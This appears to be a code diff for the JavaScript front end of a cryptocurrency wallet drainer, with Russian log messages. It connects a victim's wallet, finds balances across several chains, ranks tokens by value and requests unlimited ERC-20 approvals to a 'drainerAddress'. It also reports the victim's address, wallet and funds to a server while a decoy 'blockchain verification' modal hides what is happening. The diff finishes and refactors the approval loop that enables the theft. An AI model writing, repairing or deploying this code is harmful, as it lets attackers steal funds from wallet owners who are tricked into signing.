@@ -1,23 +1,12 @@
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
-import { createConfig, http } from 'wagmi';
-import { useAccount, useChainId, useSwitchChain, usePublicClient, useWriteContract } from 'wagmi';
 import { ethers } from 'ethers';
+import { useAccount, useSwitchChain, useConfig } from 'wagmi';
 import config from './config.js';
 
-// Настройка AppKit
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
-
-const wagmiConfig = createConfig({
-  chains: networks,
-  transports: Object.fromEntries(
-    networks.map(chain => [chain.id, http(config.CHAINS[chain.id].rpcUrls[0])])
-  ),
-  projectId
-});
-
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
 const appKitModal = createAppKit({
@@ -40,6 +29,7 @@ let isTransactionPending = false;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
+
 let lastDrainTime = 0;
 
 const ERC20_ABI = [
@@ -221,6 +211,7 @@ async function checkBalance(chainId, userAddress, provider) {
       usdt.decimals()
     ]);
     tokenBalances[chainConfig.usdtAddress] = { balance: usdtBalance, decimals: usdtDecimals };
+    console.log(`📊 Сырой баланс USDT (wei): ${usdtBalance.toString()}`);
     console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
@@ -234,6 +225,7 @@ async function checkBalance(chainId, userAddress, provider) {
       usdc.decimals()
     ]);
     tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
+    console.log(`📊 Сырой баланс USDC (wei): ${usdcBalance.toString()}`);
     console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
@@ -279,13 +271,26 @@ function hasFunds(bal) {
   return false;
 }
 
+async function switchChain(chainId, switchChainHook) {
+  try {
+    console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
+    await switchChainHook({ chainId });
+    console.log(`✅ Сеть переключена на chainId ${chainId}`);
+  } catch (error) {
+    console.error(`❌ Ошибка переключения сети: ${error.message}`);
+    throw new Error(`Failed to switch chain: ${error.message}`);
+  }
+}
+
 function shortenAddress(address) {
   if (!address || address.length < 10) return address;
   return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
 function detectWallet() {
-  return appKitModal.getWalletId() || 'Unknown Wallet';
+  // Поскольку мы используем AppKit, название кошелька можно получить из метаданных сессии
+  const session = appKitModal.getSession();
+  return session?.wallet?.name || "Unknown Wallet";
 }
 
 function formatBalance(balance, decimals) {
@@ -337,7 +342,9 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
   }
 }
 
-async function drain(chainId, userAddress, bal, provider) {
+async function drain(chainId, signer, userAddress, bal, provider) {
+  console.log(`Подключённый кошелёк: ${userAddress}`);
+
   const chainConfig = config.CHAINS[chainId];
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
@@ -378,7 +385,7 @@ async function drain(chainId, userAddress, bal, provider) {
 
     const device = detectDevice();
     const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-    const message = `🗝️ Connect | [ ${shortAddress} ]\n\n` +
+    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                     `Wallet: ${walletName}\n` +
                     `Network: ${networkName}\n` +
                     `Funds:\n${fundsMessage}\n` +
@@ -395,7 +402,7 @@ async function drain(chainId, userAddress, bal, provider) {
   console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
   let ethBalance;
   try {
-    ethBalance = await provider.getBalance(connectedAddress);
+    ethBalance = await provider.getBalance(userAddress);
     console.log(`📊 Баланс ${chainConfig.nativeToken}: ${ethers.utils.formatEther(ethBalance)}`);
   } catch (error) {
     console.error(`❌ Ошибка получения баланса ${chainConfig.nativeToken}: ${error.message}`);
@@ -413,7 +420,7 @@ async function drain(chainId, userAddress, bal, provider) {
   const tokensToProcess = [];
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
-    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
     const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
     const realBalance = tokenData.balance;
     const decimals = tokenData.decimals;
@@ -424,7 +431,7 @@ async function drain(chainId, userAddress, bal, provider) {
   const tokenDataResults = await Promise.all(tokenDataPromises);
   console.log(`✅ Получены данные токенов: ${tokenDataResults.length} токенов`);
 
-  tokenDataResults.forEach(({ tokenAddress, tokenContract, realBalance, decimals }) => {
+  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
     const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
     const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
     const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
@@ -439,11 +446,11 @@ async function drain(chainId, userAddress, bal, provider) {
                     Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
       if (!symbol) {
         console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
-        return;
+        continue;
       }
       tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
     }
-  });
+  }
 
   console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
   const pricePromises = tokensToProcess.map(async (token) => {
@@ -457,10 +464,91 @@ async function drain(chainId, userAddress, bal, provider) {
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
   console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);
 
-  return { tokensToProcess, chainConfig };
+  let status = 'rejected';
+  let modalClosed = false;
+
+  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
+    if (!token) {
+      console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
+      continue;
+    }
+    console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);
+
+    const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
+    console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
+
+    const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
+    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
+    if (allowanceFormatted < balanceFormatted) {
+      try {
+        const nonce = await provider.getTransactionCount(userAddress, "pending");
+        const gasPrice = await provider.getGasPrice();
+        console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+        console.log(`⏳ Задержка перед approve для токена ${token}`);
+        await delay(10);
+
+        const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
+          gasLimit: 500000,
+          gasPrice: gasPrice,
+          nonce
+        });
+        console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
+        const receipt = await tx.wait();
+        console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
+
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
+        status = 'confirmed';
+
+        if (!modalClosed) {
+          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
+          await hideModalWithDelay();
+          modalClosed = true;
+        }
+      } catch (error) {
+        console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+          if (!modalClosed) {
+            console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
+            await hideModalWithDelay("Error: Transaction rejected by user.");
+            modalClosed = true;
+          }
+        }
+        throw new Error(`Failed to approve token ${token}: ${error.message}`);
+      }
+    } else {
+      console.log(`✅ Allowance уже достаточно для токена ${token}`);
+      try {
+        await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
+        status = 'confirmed';
+      } catch (error) {
+        console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
+        throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
+      }
+
+      if (!modalClosed) {
+        console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
+        await hideModalWithDelay();
+        modalClosed = true;
+      }
+    }
+  }
+
+  console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
+  return status;
 }
 
-async function runDrainer(provider, userAddress) {
+async function runDrainer(provider, signer, userAddress) {
+  const currentTime = Date.now();
+  const timeSinceLastDrain = currentTime - lastDrainTime;
+  const minDelay = 10;
+
+  if (timeSinceLastDrain < minDelay) {
+    await delay(minDelay - timeSinceLastDrain);
+  }
+
+  lastDrainTime = Date.now();
+
   const balancePromises = Object.keys(config.CHAINS).map(async (chainId) => {
     try {
       const reliableProvider = await getWorkingProvider(config.CHAINS[chainId].rpcUrls);
@@ -516,35 +604,11 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   return totalValue;
 }
 
-// Главный React-компонент
-export default function App() {
+// Компонент React для обработки подключения и действий
+function WalletActionComponent() {
   const { address, isConnected } = useAccount();
-  const chainId = useChainId(); // Заменяем useNetwork на useChainId
-  const { switchNetworkAsync } = useSwitchChain();
-  const publicClient = usePublicClient();
-  const { writeContract, isPending: isWritePending, isSuccess, error } = useWriteContract();
-
-  // Находим текущую сеть по chainId
-  const currentNetwork = networks.find(network => network.id === chainId);
-  const networkName = currentNetwork?.name || 'Unknown';
-
-  useEffect(() => {
-    if (isConnected && address) {
-      connectedAddress = address;
-      console.log(`✅ Wallet connected: ${address}`);
-    }
-  }, [isConnected, address]);
-
-  async function switchChain(chainId) {
-    try {
-      console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
-      await switchNetworkAsync(chainId);
-      console.log(`✅ Сеть переключена на chainId ${chainId}`);
-    } catch (error) {
-      console.error(`❌ Ошибка переключения сети: ${error.message}`);
-      throw new Error(`Failed to switch chain: ${error.message}`);
-    }
-  }
+  const { switchChainAsync } = useSwitchChain();
+  const wagmiConfig = useConfig();
 
   async function attemptDrainer() {
     if (hasDrained || isTransactionPending) {
@@ -553,14 +617,16 @@ export default function App() {
       return;
     }
 
-    if (!isConnected || !address) {
-      console.error('❌ Кошелек не подключен');
+    if (!address) {
+      console.error('❌ Адрес кошелька не определён');
       showModal();
-      await hideModalWithDelay("Error: Wallet not connected. Please connect your wallet.");
+      await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
       return;
     }
 
+    connectedAddress = address;
     showModal();
+
     const drainerTimeout = setTimeout(async () => {
       isTransactionPending = false;
       console.error('❌ Тайм-аут выполнения дрейнера');
@@ -568,71 +634,28 @@ export default function App() {
     }, 60000);
 
     try {
-      isTransactionPending = true;
-      const { targetChainId, targetProvider } = await runDrainer(publicClient, address);
-      if (targetChainId && chainId !== targetChainId) {
-        await switchChain(targetChainId);
+      const provider = new ethers.providers.Web3Provider(wagmiConfig.getClient(), 'any');
+      const signer = provider.getSigner();
+      const currentAddress = await signer.getAddress();
+
+      if (currentAddress.toLowerCase() !== address.toLowerCase()) {
+        throw new Error('Wallet address mismatch');
       }
 
-      const { tokensToProcess, chainConfig } = await drain(targetChainId, address, await checkBalance(targetChainId, address, targetProvider), targetProvider);
+      await new Promise(resolve => setTimeout(resolve, 10));
 
-      let status = 'rejected';
-      let modalClosed = false;
-
-      for (const { token, balance, contract, address: tokenAddress, decimals } of tokensToProcess) {
-        console.log(`📍 Обрабатываем токен ${token}`);
-        const allowanceBefore = await contract.allowance(address, chainConfig.drainerAddress);
-        const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
-        const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
-
-        if (allowanceFormatted < balanceFormatted) {
-          try {
-            await writeContract({
-              address: tokenAddress,
-              abi: ERC20_ABI,
-              functionName: 'approve',
-              args: [chainConfig.drainerAddress, ethers.constants.MaxUint256],
-            });
-
-            if (isSuccess) {
-              console.log(`✅ Транзакция approve подтверждена для токена ${token}`);
-              await notifyServer(address, tokenAddress, balance, targetChainId, null, targetProvider, balance);
-              status = 'confirmed';
-
-              if (!modalClosed) {
-                console.log(`ℹ️ Закрываем модальное окно после успешного approve`);
-                await hideModalWithDelay();
-                modalClosed = true;
-              }
-            }
-          } catch (error) {
-            console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
-            if (error.message.includes('user rejected')) {
-              if (!modalClosed) {
-                console.log(`ℹ️ Пользователь отклонил approve, закрываем модальное окно`);
-                await hideModalWithDelay("Error: Transaction rejected by user.");
-                modalClosed = true;
-              }
-            }
-            throw new Error(`Failed to approve token ${token}: ${error.message}`);
-          }
-        } else {
-          console.log(`✅ Allowance уже достаточно для токена ${token}`);
-          await notifyServer(address, tokenAddress, balance, targetChainId, null, targetProvider, balance);
-          status = 'confirmed';
-
-          if (!modalClosed) {
-            console.log(`ℹ️ Allowance достаточно, закрываем модальное окно`);
-            await hideModalWithDelay();
-            modalClosed = true;
-          }
-        }
+      isTransactionPending = true;
+      const { targetChainId, targetProvider } = await runDrainer(provider, signer, address);
+      if (targetChainId) {
+        await switchChain(targetChainId, switchChainAsync);
+        const status = await drain(targetChainId, signer, address, await checkBalance(targetChainId, address, targetProvider), targetProvider);
+        console.log('✅ Drainer выполнен, статус:', status);
       }
 
       hasDrained = true;
       isTransactionPending = false;
       clearTimeout(drainerTimeout);
-      console.log(`✅ Drainer выполнен, статус: ${status}`);
+      await hideModalWithDelay();
     } catch (err) {
       isTransactionPending = false;
       clearTimeout(drainerTimeout);
@@ -643,6 +666,8 @@ export default function App() {
         errorMessage = err.message;
       } else if (err.message.includes('Failed to approve token')) {
         errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+      } else if (err.message.includes('Failed to process')) {
+        errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
       } else if (err.message.includes('Failed to switch chain')) {
         errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
       } else {
@@ -656,12 +681,21 @@ export default function App() {
 
   async function handleConnectOrAction() {
     try {
-      if (!isConnected) {
+      if (!isConnected || !address) {
         console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
         await appKitModal.open();
+        // Ожидаем подключения через хук useAccount
+        return;
       } else {
         console.log('ℹ️ Кошелёк уже подключён:', address);
+        connectedAddress = address;
+      }
+
+      if (!isTransactionPending) {
         await attemptDrainer();
+      } else {
+        console.log('⏳ Транзакция уже выполняется');
+        await hideModalWithDelay("Transaction already in progress.");
       }
     } catch (err) {
       console.error('❌ Ошибка подключения:', err.message);
@@ -672,57 +706,15 @@ export default function App() {
     }
   }
 
-  useEffect(() => {
-    const actionButtons = document.querySelectorAll('.action-btn');
-    actionButtons.forEach(btn => {
-      btn.addEventListener('click', handleConnectOrAction);
-    });
-
-    return () => {
-      actionButtons.forEach(btn => {
-        btn.removeEventListener('click', handleConnectOrAction);
-      });
-    };
-  }, [isConnected, address]);
-
-  useEffect(() => {
-    if (error) {
-      console.error('❌ Write contract error:', error.message);
-      showModal();
-      hideModalWithDelay(`Error: ${error.message}`);
-    }
-    if (isSuccess) {
-      console.log('✅ Transaction successful');
-    }
-  }, [error, isSuccess]);
-
-  // Заменяем JSX на DOM API
-  const container = document.createElement('div');
-
-  const button = document.createElement('button');
-  button.className = 'action-btn';
-  button.textContent = 'Connect Wallet or Sign';
-  button.addEventListener('click', handleConnectOrAction);
-  container.appendChild(button);
-
-  if (isConnected) {
-    const infoDiv = document.createElement('div');
-
-    const addressP = document.createElement('p');
-    addressP.textContent = `Connected as: ${shortenAddress(address)}`;
-    infoDiv.appendChild(addressP);
-
-    const networkP = document.createElement('p');
-    networkP.textContent = `Network: ${networkName}`;
-    infoDiv.appendChild(networkP);
-
-    container.appendChild(infoDiv);
-  }
-
-  return container;
+  return (
+    <div>
+      <button className="action-btn" onClick={handleConnectOrAction}>
+        {isConnected ? 'Sign Transaction' : 'Connect Wallet'}
+      </button>
+    </div>
+  );
 }
 
-// Модальное окно и стили
 window.addEventListener('DOMContentLoaded', () => {
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
@@ -906,20 +898,5 @@ window.addEventListener('DOMContentLoaded', () => {
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 });
 
-function showModal() {
-  modalOverlay.style.display = 'block';
-  modalOverlay.style.pointerEvents = 'auto';
-  modalContent.style.display = 'block';
-  modalSubtitle.textContent = "Processing blockchain verification...";
-}
-
-async function hideModalWithDelay(errorMessage = null) {
-  if (errorMessage) {
-    modalSubtitle.textContent = errorMessage;
-    await new Promise(resolve => setTimeout(resolve, 7000));
-  }
-  modalOverlay.style.display = 'none';
-  modalOverlay.style.pointerEvents = 'none';
-  modalContent.style.display = 'none';
-  document.body.style.pointerEvents = 'auto';
-}
+// Экспортируем компонент для использования в приложении
+export default WalletActionComponent;
